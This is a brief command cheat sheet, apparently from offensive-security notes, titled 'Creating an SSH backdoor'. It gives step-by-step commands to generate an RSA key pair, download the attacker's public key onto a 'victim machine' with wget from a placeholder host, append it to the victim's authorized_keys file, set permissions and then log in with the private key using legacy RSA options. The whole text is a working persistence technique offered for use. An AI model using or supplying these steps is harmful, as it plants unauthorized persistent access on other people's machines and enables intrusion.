Creating an SSH backdoor -
  
	ssh-keygen -t rsa # Generate Public and Private ssh keys
	wget http://<IP Address:Port/id_rsa.pub> # Put the id_rsa.pub on the victim machine
	cat id_rsa.pub >> authorized_keys # add the contents of the public key to victims ssh authorized key file
	chmod 700 ~/ # setting correct permissions
	chmod 700 ~/.ssh # setting correct permissions
	chmod 600 ~/.ssh/authorized_keys # setting correct permissions
	ssh -i id_rsa USER@IP ADDRESS -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa # initiate SSH connection using the SSH key
